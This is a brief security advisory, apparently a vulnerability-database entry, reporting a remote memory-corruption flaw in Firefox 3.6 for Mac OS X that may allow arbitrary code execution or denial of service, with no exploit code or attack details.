Mozilla Firefox is prone to a remote memory-corruption vulnerability.

Successful exploits may allow an attacker to execute arbitrary code in the context of the user running the affected application. Failed exploit attempts will result in a denial-of-service condition.

Firefox 3.6 for Apple Mac OS X is vulnerable.

NOTE: This issue was previously covered in BID 38918 (Mozilla Firefox Thunderbird and Seamonkey MFSA 2010-09 through -15 Multiple Vulnerabilities) but has been assigned its own record to better document it.
